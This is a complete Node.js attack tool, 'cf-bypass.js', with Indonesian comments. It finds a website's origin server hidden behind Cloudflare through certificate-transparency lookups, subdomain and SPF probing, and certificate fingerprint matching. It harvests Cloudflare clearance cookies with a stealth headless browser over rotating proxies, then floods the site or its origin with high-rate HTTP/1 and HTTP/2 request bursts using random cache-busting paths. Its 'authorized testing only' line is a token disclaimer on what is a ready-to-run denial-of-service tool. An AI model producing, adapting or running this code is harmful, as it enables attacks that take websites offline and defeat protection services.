#!/usr/bin/env node
// cf-bypass.js — PART 1/2
// Authorized testing only. | Author: VANTA
// Depends: ./proxy-pool.js, https-proxy-agent, socks-proxy-agent, socks,
//          playwright, playwright-extra, puppeteer-extra-plugin-stealth

'use strict';

const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const dns = require('dns').promises;
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

const {
  loadProxyFile,
  buildAgent,
  healthCheckAll,
  ProxyPool,
} = require('./proxy-pool');

// ============================================================
// 1. CLI
// ============================================================
// ============================================================
// 1. INPUT (interactive)
// ============================================================
const readline = require('readline');

function ask(q) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((res) => rl.question(q, (a) => { rl.close(); res(a.trim()); }));
}

async function promptConfig() {
  console.log(`\x1b[36m╔══════════════════════════════════════╗
║  cf-bypass.js — VANTA                 ║
╚══════════════════════════════════════╝\x1b[0m`);

  let target;
  while (!target || !/^https?:\/\//.test(target)) {
    target = await ask('Target URL (https://...): ');
  }
  const proxyFile = await ask('Proxy file (kosong = tanpa proxy): ');
  const vector = (await ask('Vector [mixed/http1/http2] (default mixed): ')) || 'mixed';
  const threads = parseInt(await ask('Solver sessions (default 5): ')) || 5;
  const duration = parseInt(await ask('Duration ms (default 300000): ')) || 300000;

  return {
    target: target.replace(/\/$/, ''),
    proxyFile: proxyFile || null,
    proxy: null,
    duration, vector,
    workers: 200, threads,
    doOrigin: true, doSolve: true, doAttack: true,
    headless: true, outDir: './cf-out',
    healthOnly: false,
  };
}

// CFG diisi async — semua fungsi di bawah pakai CFG setelah init
let CFG, TARGET_URL, TARGET_HOST, TARGET_PATH, APEX, OUT;
let log, phase;

async function initConfig() {
  CFG = await promptConfig();
  TARGET_URL = new URL(CFG.target);
  TARGET_HOST = TARGET_URL.hostname;
  TARGET_PATH = TARGET_URL.pathname || '/';
  APEX = TARGET_HOST.split('.').slice(-2).join('.');
  OUT = path.resolve(CFG.outDir);
  fs.mkdirSync(OUT, { recursive: true });
  log = (s) => console.log(s);
  phase = (s) => log(`\n\x1b[36m══ ${s} ══\x1b[0m`);
}
// ============================================================
// 2. UTILS
// ============================================================
function fetchText(url, timeout = 15000) {
  return new Promise((res, rej) => {
    const r = https.get(url, { rejectUnauthorized: false }, (x) => {
      let b = ''; x.on('data', c => b += c); x.on('end', () => res(b));
    });
    r.on('error', rej);
    r.setTimeout(timeout, () => r.destroy(new Error('timeout')));
  });
}
async function fetchJson(url, t) { return JSON.parse(await fetchText(url, t)); }

const ipToInt = (ip) => ip.split('.').reduce((a, b) => (a << 8) + parseInt(b), 0) >>> 0;
const inCidr = (ip, c) => {
  const [n, b] = c.split('/');
  const m = ~((1 << (32 - parseInt(b))) - 1) >>> 0;
  return (ipToInt(ip) & m) === (ipToInt(n) & m);
};
const pick = (a) => a[Math.floor(Math.random() * a.length)];
const rhex = (n) => crypto.randomBytes(Math.ceil(n / 2)).toString('hex').slice(0, n);

// ============================================================
// 3. PROXY POOL INIT
// ============================================================
async function initProxies() {
  if (!CFG.proxyFile) return null;
  phase('PHASE 0: PROXY POOL');
  const p = loadProxyFile(CFG.proxyFile);
  log(`[*] ${p.length} proxy unik loaded`);
  const http = p.filter(x => !x.protocol.startsWith('socks')).length;
  log(`[*] http: ${http} | socks: ${p.length - http}`);
  log(`[*] health check...`);
  const t0 = Date.now();
  const r = await healthCheckAll(p, 100);
  log(`[+] alive: ${r.alive} | dead: ${r.dead} (${((Date.now() - t0) / 1000).toFixed(1)}s)`);
  const pool = new ProxyPool(p);
  const a = pool.alive();
  if (a.length) {
    const lat = a.filter(x => x.latencyMs).map(x => x.latencyMs).sort((x, y) => x - y);
    if (lat.length) log(`[*] latency: min ${lat[0]}ms | med ${lat[Math.floor(lat.length / 2)]}ms | max ${lat[lat.length - 1]}ms`);
  }
  fs.writeFileSync(path.join(OUT, 'proxy-pool.json'), JSON.stringify(a.map(x => ({
    protocol: x.protocol, host: x.host, port: x.port,
    latencyMs: x.latencyMs, exitIp: x.exitIp,
  })), null, 2));
  return pool;
}

// ============================================================
// 4. CF DETECT
// ============================================================
function detectCf() {
  return new Promise((res) => {
    const r = https.request({
      host: TARGET_HOST, port: 443, method: 'HEAD', path: TARGET_PATH,
      servername: TARGET_HOST, rejectUnauthorized: false, timeout: 8000,
    }, (x) => res({ cf: !!x.headers['cf-ray'], server: x.headers['server'], status: x.statusCode }));
    r.on('error', () => res({ cf: false, error: 'unreachable' }));
    r.on('timeout', () => { r.destroy(); res({ cf: false, error: 'timeout' }); });
    r.end();
  });
}

// ============================================================
// 5. ORIGIN HUNT
// ============================================================
let CF_RANGES = [];
async function loadCf() {
  try {
    CF_RANGES = (await fetchText('https://www.cloudflare.com/ips-v4')).split('\n').map(s => s.trim()).filter(Boolean);
  } catch { CF_RANGES = []; }
}
const isCf = (ip) => CF_RANGES.length && CF_RANGES.some(c => inCidr(ip, c));

async function crtSh(domain) {
  try {
    const d = await fetchJson(`https://crt.sh/?q=%25.${domain}&output=json`);
    const s = new Set();
    for (const e of d) for (const n of e.name_value.split('\n')) {
      const c = n.trim().replace(/^\*\./, '');
      if (c.endsWith(domain) && c !== domain) s.add(c);
    }
    return [...s];
  } catch { return []; }
}

async function spfIps(domain) {
  try {
    const r = await dns.resolveTxt(domain);
    const spf = r.flat().find(x => x.startsWith('v=spf1'));
    if (!spf) return [];
    return [...spf.matchAll(/ip4:(\d+\.\d+\.\d+\.\d+)/g)].map(m => m[1]);
  } catch { return []; }
}

async function resolveSubs(subs) {
  const out = [];
  for (const s of subs) {
    try {
      for (const ip of await dns.resolve4(s)) if (!isCf(ip)) out.push({ sub: s, ip });
    } catch {}
  }
  return out;
}

function grabCert(ip, sni, port = 443, t = 6000) {
  return new Promise((res) => {
    const x = tls.connect({ host: ip, port, servername: sni, rejectUnauthorized: false, timeout: t }, () => {
      const c = x.getPeerCertificate(); x.end(); res(c);
    });
    x.on('error', () => res(null));
    x.on('timeout', () => { x.destroy(); res(null); });
  });
}
const certFp = (c) => c && c.raw ? crypto.createHash('sha256').update(c.raw).digest('hex') : null;

function probeHost(ip, host, port = 443) {
  return new Promise((res) => {
    const r = https.request({
      host: ip, port, method: 'GET', path: TARGET_PATH,
      headers: { 'Host': host, 'User-Agent': 'Mozilla/5.0' },
      servername: host, rejectUnauthorized: false, timeout: 6000,
    }, (x) => {
      let b = '';
      x.on('data', c => { if (b.length < 1500) b += c; });
      x.on('end', () => res({
        ip, status: x.statusCode, cf: x.headers['cf-ray'],
        title: (b.match(/<title>([^<]*)<\/title>/i) || [])[1],
      }));
    });
    r.on('error', () => res(null));
    r.on('timeout', () => { r.destroy(); res(null); });
    r.end();
  });
}

async function originHunt() {
  phase('PHASE 1: ORIGIN HUNT');
  await loadCf();
  const subs = await crtSh(APEX);
  log(`[*] crt.sh: ${subs.length} subdomain`);
  const common = ['direct', 'origin', 'dev', 'staging', 'mail', 'webmail', 'ftp', 'cpanel', 'backend', 'api', 'admin', 'portal', 'vpn', 'git', 'jenkins'];
  for (const c of common) subs.push(`${c}.${APEX}`);

  const resolved = await resolveSubs([...new Set(subs)]);
  const spf = (await spfIps(APEX)).map(ip => ({ sub: 'spf', ip }));
  const all = [...resolved, ...spf];
  const seen = new Set();
  const uniq = all.filter(x => x.ip && !seen.has(x.ip) && seen.add(x.ip));
  log(`[*] ${uniq.length} kandidat non-CF`);
  if (!uniq.length) return [];

  const cfCert = await grabCert(TARGET_HOST, TARGET_HOST);
  const cfFp = certFp(cfCert);
  const hits = [];
  for (const { sub, ip } of uniq) {
    const c = await grabCert(ip, TARGET_HOST);
    if (c) {
      const f = certFp(c);
      const sanMatch = (c.subjectaltname || '').includes(TARGET_HOST);
      if (f === cfFp || sanMatch) {
        hits.push({ ip, sub, fp: f });
        log(`    [+++] FP MATCH: ${ip} (${sub})`);
        continue;
      }
    }
    const p = await probeHost(ip, TARGET_HOST);
    if (p && p.status === 200 && !p.cf) {
      hits.push({ ip, sub, ...p });
      log(`    [+++] PROBE 200: ${ip} (${sub})`);
    }
  }
  if (hits.length) {
    fs.writeFileSync(path.join(OUT, 'origin.json'), JSON.stringify(hits, null, 2));
    log(`\n\x1b[32m[+++] ORIGIN DITEMUKAN\x1b[0m`);
  } else log(`[!] origin gak ketemu — fallback solver`);
  return hits;
}
// cf-bypass.js — PART 2/2
// Sambung langsung setelah originHunt() di Part 1.

// ============================================================
// 6. SOLVER
// ============================================================
async function solve(pool) {
  phase('PHASE 2: SOLVE CF CHALLENGE');
  let chromium, Stealth;
  try {
    chromium = require('playwright-extra').chromium;
    Stealth = require('puppeteer-extra-plugin-stealth');
    chromium.use(Stealth());
  } catch {
    log(`[!] npm i playwright playwright-extra puppeteer-extra-plugin-stealth && npx playwright install chromium`);
    return [];
  }

  const b = await chromium.launch({
    headless: CFG.headless,
    args: ['--disable-blink-features=AutomationControlled', '--no-sandbox', '--disable-dev-shm-usage'],
  });

  const sessions = [];
  for (let i = 0; i < CFG.threads; i++) {
    let proxyRef = null, proxyArg = null;
    if (pool) {
      proxyRef = pool.fastest();
      if (proxyRef) {
        proxyArg = {
          server: `${proxyRef.protocol}://${proxyRef.host}:${proxyRef.port}`,
          username: proxyRef.username || undefined,
          password: proxyRef.password || undefined,
        };
      }
    } else if (CFG.proxy) {
      proxyArg = { server: CFG.proxy };
    }

    const ctx = await b.newContext({
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      viewport: { width: 1920, height: 1080 },
      locale: 'en-US', timezoneId: 'America/New_York',
      proxy: proxyArg || undefined,
    });
    const pg = await ctx.newPage();
    log(`[*] sesi ${i + 1} via ${proxyRef ? `${proxyRef.host}:${proxyRef.port}` : 'direct'}`);
    try { await pg.goto(CFG.target, { waitUntil: 'domcontentloaded', timeout: 35000 }); } catch {}

    const t0 = Date.now();
    let cl = null;
    while (Date.now() - t0 < 60000) {
      const c = await ctx.cookies();
      cl = c.find(x => x.name === 'cf_clearance');
      if (cl) break;
      await new Promise(r => setTimeout(r, 500));
    }
    if (!cl) {
      log(`[!] sesi ${i + 1}: gagal`);
      if (proxyRef && pool) pool.markFail(proxyRef);
      await ctx.close();
      continue;
    }
    const ua = await pg.evaluate(() => navigator.userAgent);
    const all = await ctx.cookies();
    const cookieStr = all.map(c => `${c.name}=${c.value}`).join('; ');
    sessions.push({
      ua, cookieStr, allCookies: all,
      proxy: proxyRef,
      harvestedAt: Date.now(),
      expiresAt: Date.now() + 28 * 60 * 1000,
    });
    log(`[+] sesi ${i + 1}: cf_clearance OK`);
    if (proxyRef && pool) pool.markOk(proxyRef);
    await ctx.close();
  }
  await b.close();

  if (sessions.length) {
    fs.writeFileSync(path.join(OUT, 'sessions.json'), JSON.stringify(sessions.map(s => ({
      ua: s.ua, cookieStr: s.cookieStr,
      proxy: s.proxy ? `${s.proxy.host}:${s.proxy.port}` : null,
      expiresAt: s.expiresAt,
    })), null, 2));
    log(`[+] ${sessions.length} sesi disimpan`);
  }
  return sessions;
}

// ============================================================
// 7. ATTACK
// ============================================================
function paths() {
  const p = TARGET_PATH === '/' ? '' : TARGET_PATH;
  return [
    p + '/?s=' + rhex(8),
    p + '?q=' + rhex(6),
    p + '?cache=' + rhex(10),
    p + '?rand=' + rhex(12),
    p,
    p + '/',
  ];
}

function hdrs(s) {
  return {
    'User-Agent': s.ua, 'Cookie': s.cookieStr,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'no-cache', 'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none', 'Upgrade-Insecure-Requests': '1',
    'Connection': 'keep-alive',
  };
}

const st = { sent: 0, ok: 0, chal: 0, err: 0, bytes: 0, t0: Date.now() };
function stat() {
  setInterval(() => {
    const e = (Date.now() - st.t0) / 1000;
    process.stdout.write(`\r[+] req:${st.sent} ok:${st.ok} chal:${st.chal} err:${st.err} rps:${(st.sent / e).toFixed(0)} mbps:${((st.bytes * 8) / e / 1e6).toFixed(2)}`);
  }, 1000);
}

function h1(sessions, pool) {
  const ps = paths();
  const cache = new Map();
  const getAgent = (s) => {
    if (s.proxy) {
      const k = `${s.proxy.host}:${s.proxy.port}`;
      if (!cache.has(k)) cache.set(k, buildAgent(s.proxy));
      return cache.get(k);
    }
    if (pool) {
      const p = pool.random();
      if (!p) {
        if (!cache.has('direct')) cache.set('direct', new https.Agent({ keepAlive: true, rejectUnauthorized: false }));
        return cache.get('direct');
      }
      const k = `${p.host}:${p.port}`;
      if (!cache.has(k)) cache.set(k, buildAgent(p));
      return cache.get(k);
    }
    if (!cache.has('direct')) cache.set('direct', new https.Agent({ keepAlive: true, rejectUnauthorized: false }));
    return cache.get('direct');
  };

  const fire = () => {
    const s = pick(sessions);
    const agent = getAgent(s);
    const r = https.request({
      host: TARGET_HOST, port: 443,
      path: pick(ps), method: pick(['GET', 'POST']),
      headers: hdrs(s), agent,
    }, (x) => {
      st.sent++;
      if (x.statusCode === 200) st.ok++;
      else if ([403, 503].includes(x.statusCode)) st.chal++;
      x.on('data', c => st.bytes += c.length);
    });
    r.on('error', () => {
      st.err++;
      if (s.proxy && pool) pool.markFail(s.proxy);
    });
    r.setTimeout(8000, () => r.destroy());
    r.end();
  };
  const burst = () => { for (let i = 0; i < 80; i++) fire(); };
  burst(); setInterval(burst, 80);
}

function h2(sessions, pool) {
  const ps = paths();
  const usable = sessions.filter(s => !s.proxy || s.proxy.protocol.startsWith('socks'));
  if (!usable.length) {
    log(`[!] H2 butuh SOCKS5 proxy. fallback ke H1.`);
    return h1(sessions, pool);
  }
  const clients = usable.map(s => {
    const opts = { rejectUnauthorized: false };
    if (s.proxy) {
      opts.createConnection = (o, cb) => {
        try {
          const { SocksClient } = require('socks');
          SocksClient.createConnection({
            proxy: {
              host: s.proxy.host, port: s.proxy.port,
              type: s.proxy.protocol === 'socks4' ? 4 : 5,
              userId: s.proxy.username, password: s.proxy.password,
            },
            command: 'connect',
            destination: { host: o.host, port: o.port },
          }).then(({ socket }) => {
            const t = tls.connect({ socket, servername: o.servername || o.host }, () => cb(null, t));
            t.on('error', cb);
          }).catch(cb);
        } catch (e) { cb(e); }
      };
    }
    const c = http2.connect(CFG.target, opts);
    c.on('error', () => {});
    c.on('goaway', () => c.destroy());
    return { c, s };
  });

  const fire = ({ c, s }) => {
    if (c.destroyed) return;
    try {
      const r = c.request({
        ':method': 'GET', ':path': pick(ps),
        ':scheme': 'https', ':authority': TARGET_HOST,
        ...hdrs(s),
      }, { endStream: true });
      r.on('response', (h) => {
        st.sent++;
        if (h[':status'] === 200) st.ok++;
        else if ([403, 503].includes(h[':status'])) st.chal++;
      });
      r.on('data', c => st.bytes += c.length);
      r.on('error', () => st.err++);
    } catch { st.err++; }
  };
  const burst = () => { for (const e of clients) for (let i = 0; i < 30; i++) fire(e); };
  burst(); setInterval(burst, 30);
}

async function attack(sessions, pool) {
  phase(`PHASE 3: ATTACK (${CFG.vector})`);
  if (!sessions.length) { log(`[!] gak ada sesi`); return; }
  stat();
  if (CFG.vector === 'http1') h1(sessions, pool);
  else if (CFG.vector === 'http2') h2(sessions, pool);
  else { h1(sessions, pool); h2(sessions, pool); }
  await new Promise(r => setTimeout(r, CFG.duration));
  log(`\n[+] selesai. ok:${st.ok} chal:${st.chal} err:${st.err}`);
}

async function attackDirect(origins) {
  phase('PHASE 3b: ATTACK ORIGIN DIRECT');
  const ps = paths();
  const ag = new https.Agent({ keepAlive: true, maxSockets: CFG.workers, rejectUnauthorized: false });
  const fire = (o) => {
    const r = https.request({
      host: o.ip, port: 443, path: pick(ps), method: pick(['GET', 'POST', 'HEAD']),
      headers: {
        'Host': TARGET_HOST, 'User-Agent': o.ua,
        'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
      },
      servername: TARGET_HOST, agent: ag,
    }, (x) => {
      st.sent++;
      if (x.statusCode < 400) st.ok++;
      x.on('data', c => st.bytes += c.length);
    });
    r.on('error', () => st.err++);
    r.setTimeout(8000, () => r.destroy());
    r.end();
  };
  stat();
  const burst = () => { for (const o of origins) for (let i = 0; i < 120; i++) fire(o); };
  burst(); setInterval(burst, 50);
  await new Promise(r => setTimeout(r, CFG.duration));
  log(`\n[+] selesai. ok:${st.ok} err:${st.err}`);
}

// ============================================================
// 8. MAIN
// ============================================================
(async () => {
  await initConfig();

  log(`[*] target: ${CFG.target}`);
  log(`[*] host: ${TARGET_HOST} | path: ${TARGET_PATH} | apex: ${APEX}`);
  log(`[*] vector: ${CFG.vector} | workers: ${CFG.workers} | duration: ${CFG.duration}ms`);

  const pool = await initProxies();

  let origins = [];
  if (CFG.doOrigin) origins = await originHunt();

  let sessions = [];
  if (!origins.length && CFG.doSolve) sessions = await solve(pool);

  if (CFG.doAttack) {
    if (origins.length) {
      log(`\n[*] origin tersedia — attack direct`);
      const os = origins.slice(0, 3).map(o => ({
        ip: o.ip,
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      }));
      await attackDirect(os);
    } else if (sessions.length) {
      await attack(sessions, pool);
    } else {
      log(`\n[!] gak ada jalur. coba --headful --no-attack buat debug, atau --proxy-file residential.`);
    }
  }
  log(`\n[*] output: ${OUT}`);
})().catch(e => {
  console.error(`\n[!] fatal: ${e.message}`);
  process.exit(1);
});
